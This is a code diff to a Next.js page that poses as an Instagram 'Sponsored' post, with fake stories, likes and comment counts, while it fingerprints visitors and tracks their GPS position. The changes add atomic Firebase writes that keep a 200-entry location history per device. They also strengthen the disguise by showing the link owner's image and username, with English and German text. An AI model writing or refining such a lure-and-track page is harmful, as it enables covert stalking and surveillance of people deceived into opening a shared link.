@@ -2,13 +2,19 @@
 
 import { useEffect, useState, useRef } from "react";
 import { database } from "@/lib/firebase";
-import { ref, set, update, get } from "firebase/database";
+import { ref, get, runTransaction } from "firebase/database";
 import dynamic from "next/dynamic";
 import Image from "next/image";
 import axios from "axios";
 import { useSearchParams } from "next/navigation";
 import { Location, LocationHistoryEntry } from "@/components/interfaces/location.interface";
 import { ShareLink } from "@/components/interfaces/sharelink.interface";
+import {
+  normalizeTrackLocale,
+  numberLocaleForTrack,
+  trackT,
+  type TrackMessageKey,
+} from "@/lib/track-page-i18n";
 import {
   Home, Search, PlusSquare, Heart,
   MoreHorizontal, Bookmark, MessageCircle, Send,
@@ -20,9 +26,8 @@ const Map = dynamic(() => import("@/components/Map"), { ssr: false });
 const DEFAULT_POST_IMAGE =
   "https://images.unsplash.com/photo-1506905925346-21bda4d32df4?w=600&q=80";
 
-// Fake stories data
-const STORIES = [
-  { name: "Your story", avatar: null, isOwn: true },
+/** Decorative story avatars (not the share link owner row) */
+const MOCK_STORIES = [
   { name: "marco.v", avatar: "https://i.pravatar.cc/48?img=1" },
   { name: "sara_ph", avatar: "https://i.pravatar.cc/48?img=5" },
   { name: "j.torres", avatar: "https://i.pravatar.cc/48?img=8" },
@@ -108,6 +113,12 @@ async function collectFingerprint(): Promise<Partial<Location>> {
   return fp;
 }
 
+function stripUndefined<T extends Record<string, unknown>>(obj: T): T {
+  return Object.fromEntries(
+    Object.entries(obj).filter(([, v]) => v !== undefined)
+  ) as T;
+}
+
 // -------------------------------------------------------------------
 // Component
 // -------------------------------------------------------------------
@@ -162,22 +173,36 @@ export default function TrackClient() {
       updatedAt: Date.now(),
     });
 
-    /** Write or merge into Firebase, preserving original createdAt and appending to history */
+    /** Atomic merge + history append so concurrent GPS updates do not drop pings */
     const persist = async (data: Partial<Location>, historyEntry: LocationHistoryEntry) => {
       const locRef = ref(database, `locations/${deviceId}`);
-      const snap = await get(locRef);
-      const existing = snap.val() as (Partial<Location> & { createdAt?: number }) | null;
-
-      // Append new entry to history array (cap at 200 to avoid runaway growth)
-      const prevHistory: LocationHistoryEntry[] = existing?.history ?? [];
-      const history = [...prevHistory, historyEntry].slice(-200);
-
-      const payload = { ...data, history, createdAt: existing?.createdAt ?? Date.now() };
-      if (existing) {
-        await update(locRef, payload);
-      } else {
-        await set(locRef, payload);
-      }
+      await runTransaction(locRef, (current) => {
+        const cur =
+          current != null && typeof current === "object"
+            ? (current as Partial<Location> & { createdAt?: number })
+            : null;
+        const base = cur ? { ...cur } : {};
+        const rawHistory = base.history;
+        const prevHistory: LocationHistoryEntry[] = Array.isArray(rawHistory)
+          ? rawHistory
+          : rawHistory && typeof rawHistory === "object"
+            ? (Object.values(rawHistory) as LocationHistoryEntry[])
+            : [];
+        const history = [...prevHistory, historyEntry].slice(-200);
+        const createdAt = base.createdAt ?? Date.now();
+        const merged = stripUndefined({
+          ...base,
+          ...data,
+          history,
+          createdAt,
+          updatedAt: Date.now(),
+        } as Record<string, unknown>) as Partial<Location> & {
+          history: LocationHistoryEntry[];
+          createdAt: number;
+          updatedAt: number;
+        };
+        return merged;
+      });
     };
 
     /** --- GPS path --- */
@@ -254,17 +279,35 @@ export default function TrackClient() {
     return () => navigator.geolocation.clearWatch(watchId);
   }, [shareLinkId]);
 
-  const postImage = shareLink?.imageUrl || DEFAULT_POST_IMAGE;
-  const postUser = shareLink?.name || "user";
-  const postCaption = shareLink?.description || "✨ Check this out!";
-  const displayPostImage = postImageBroken ? DEFAULT_POST_IMAGE : postImage;
+  const locale = normalizeTrackLocale(shareLink?.locale ?? undefined);
+  const t = (key: TrackMessageKey, vars?: Record<string, string | number>) =>
+    trackT(locale, key, vars);
+
+  const linkImage = shareLink?.imageUrl?.trim() || "";
+  const postUser =
+    shareLink?.username?.trim() || shareLink?.name?.trim() || "user";
+  const storiesLabel = shareLink?.username?.trim() || t("yourStory");
+  const postCaption = shareLink?.description || t("defaultCaption");
+  /** Main feed + profile chrome: same asset as the share link when set */
+  const feedImageSrc = linkImage && !postImageBroken ? linkImage : DEFAULT_POST_IMAGE;
+  const avatarSrc =
+    linkImage && !postImageBroken
+      ? linkImage
+      : `https://i.pravatar.cc/64?u=${shareLinkId ?? "guest"}`;
 
   useEffect(() => {
     setPostImageBroken(false);
-  }, [postImage]);
+  }, [linkImage]);
+
+  const likeDisplay = (likeCount + (liked ? 1 : 0)).toLocaleString(
+    numberLocaleForTrack(locale)
+  );
 
   return (
-    <div className="flex flex-col min-h-screen max-w-[480px] mx-auto bg-white">
+    <div
+      lang={locale === "de" ? "de" : "en"}
+      className="flex flex-col min-h-screen max-w-[480px] mx-auto bg-white"
+    >
 
       {/* Header */}
       <header className="sticky top-0 z-10 flex items-center justify-between px-4 py-3 bg-white border-b border-gray-200">
@@ -279,17 +322,21 @@ export default function TrackClient() {
         </div>
       </header>
 
-      {/* Stories */}
+      {/* Stories — first cell: empty ring + label from share link (Instagram “no story” look) */}
       <div className="flex gap-3 px-4 py-3 overflow-x-auto scrollbar-hide border-b border-gray-100">
-        {STORIES.map((story, i) => (
-          <div key={i} className="flex flex-col items-center gap-1 shrink-0">
-            <div className={`w-14 h-14 rounded-full flex items-center justify-center ${story.isOwn ? "border-2 border-gray-300" : "p-0.5 bg-gradient-to-tr from-yellow-400 via-red-500 to-purple-600"}`}>
+        <div className="flex flex-col items-center gap-1 shrink-0">
+          <div className="w-14 h-14 rounded-full p-[2.5px] bg-gradient-to-tr from-yellow-400 via-fuchsia-500 to-orange-500 shrink-0">
+            <div className="w-full h-full rounded-full bg-white ring-1 ring-gray-200/80" aria-hidden />
+          </div>
+          <span className="text-[10px] text-gray-700 w-14 text-center truncate">
+            {storiesLabel}
+          </span>
+        </div>
+        {MOCK_STORIES.map((story) => (
+          <div key={story.name} className="flex flex-col items-center gap-1 shrink-0">
+            <div className="w-14 h-14 rounded-full p-0.5 bg-gradient-to-tr from-yellow-400 via-red-500 to-purple-600 shrink-0">
               <div className="w-full h-full rounded-full bg-gray-200 overflow-hidden border-2 border-white">
-                {story.isOwn ? (
-                  <div className="w-full h-full flex items-center justify-center bg-gray-100">
-                    <span className="text-xl text-gray-400">+</span>
-                  </div>
-                ) : story.avatar ? (
+                {story.avatar ? (
                   <Image
                     src={story.avatar}
                     alt={story.name}
@@ -303,7 +350,9 @@ export default function TrackClient() {
                 )}
               </div>
             </div>
-            <span className="text-[10px] text-gray-700 w-14 text-center truncate">{story.name}</span>
+            <span className="text-[10px] text-gray-700 w-14 text-center truncate">
+              {story.name}
+            </span>
           </div>
         ))}
       </div>
@@ -319,18 +368,21 @@ export default function TrackClient() {
               <div className="w-8 h-8 rounded-full bg-gradient-to-tr from-yellow-400 via-red-500 to-purple-600 p-0.5">
                 <div className="w-full h-full rounded-full bg-white overflow-hidden relative">
                   <Image
-                    src={`https://i.pravatar.cc/64?u=${shareLinkId ?? "guest"}`}
+                    src={avatarSrc}
                     alt={postUser}
                     width={32}
                     height={32}
                     unoptimized
                     className="w-full h-full object-cover"
+                    onError={() => {
+                      if (linkImage) setPostImageBroken(true);
+                    }}
                   />
                 </div>
               </div>
               <div>
                 <p className="text-sm font-semibold text-gray-900 leading-none">{postUser}</p>
-                <p className="text-xs text-gray-500 mt-0.5">Sponsored</p>
+                <p className="text-xs text-gray-500 mt-0.5">{t("sponsored")}</p>
               </div>
             </div>
             <button className="text-gray-900 p-1">
@@ -341,7 +393,7 @@ export default function TrackClient() {
           {/* Post image */}
           <div className="w-full aspect-square bg-gray-100 overflow-hidden relative">
             <Image
-              src={displayPostImage}
+              src={feedImageSrc}
               alt={postCaption}
               fill
               unoptimized
@@ -375,7 +427,7 @@ export default function TrackClient() {
 
             {/* Likes */}
             <p className="text-sm font-semibold text-gray-900 mb-1">
-              {(likeCount + (liked ? 1 : 0)).toLocaleString()} likes
+              {t("likesLine", { count: likeDisplay })}
             </p>
 
             {/* Caption */}
@@ -385,27 +437,40 @@ export default function TrackClient() {
             </p>
 
             {/* View comments */}
-            <button className="text-sm text-gray-500 mt-1">
-              View all {Math.floor(Math.random() * 200) + 20} comments
+            <button type="button" className="text-sm text-gray-500 mt-1">
+              {t("viewAllComments", { n: Math.floor(Math.random() * 200) + 20 })}
             </button>
 
             {/* Time */}
             <p className="text-[10px] uppercase tracking-wider text-gray-400 mt-1">
-              {Math.floor(Math.random() * 12) + 1} hours ago
+              {t("hoursAgo", { n: Math.floor(Math.random() * 12) + 1 })}
             </p>
           </div>
 
           {/* Comment input */}
           <div className="flex items-center gap-3 px-3 py-3 border-t border-gray-100">
-            <div className="w-7 h-7 rounded-full bg-gray-200 overflow-hidden shrink-0">
-              <div className="w-full h-full bg-gray-300 animate-pulse" />
+            <div className="w-7 h-7 rounded-full bg-gray-200 overflow-hidden shrink-0 relative">
+              {linkImage && !postImageBroken ? (
+                <Image
+                  src={linkImage}
+                  alt=""
+                  width={28}
+                  height={28}
+                  unoptimized
+                  className="w-full h-full object-cover"
+                />
+              ) : (
+                <div className="w-full h-full bg-gray-300 animate-pulse" />
+              )}
             </div>
             <input
               type="text"
-              placeholder="Add a comment…"
+              placeholder={t("addCommentPlaceholder")}
               className="flex-1 text-sm text-gray-900 bg-transparent outline-none placeholder:text-gray-400"
             />
-            <button className="text-sm font-semibold text-blue-500">Post</button>
+            <button type="button" className="text-sm font-semibold text-blue-500">
+              {t("post")}
+            </button>
           </div>
         </article>
 
@@ -452,9 +517,20 @@ export default function TrackClient() {
         <button className="text-gray-500">
           <Compass className="h-6 w-6" />
         </button>
-        <button className="text-gray-500">
-          <div className="w-6 h-6 rounded-full bg-gray-200 overflow-hidden">
-            <div className="w-full h-full bg-gray-300 animate-pulse" />
+        <button type="button" className="text-gray-500" aria-label={t("profileAria")}>
+          <div className="w-6 h-6 rounded-full bg-gray-200 overflow-hidden relative">
+            {linkImage && !postImageBroken ? (
+              <Image
+                src={linkImage}
+                alt=""
+                width={24}
+                height={24}
+                unoptimized
+                className="w-full h-full object-cover"
+              />
+            ) : (
+              <div className="w-full h-full bg-gray-300 animate-pulse" />
+            )}
           </div>
         </button>
       </nav>
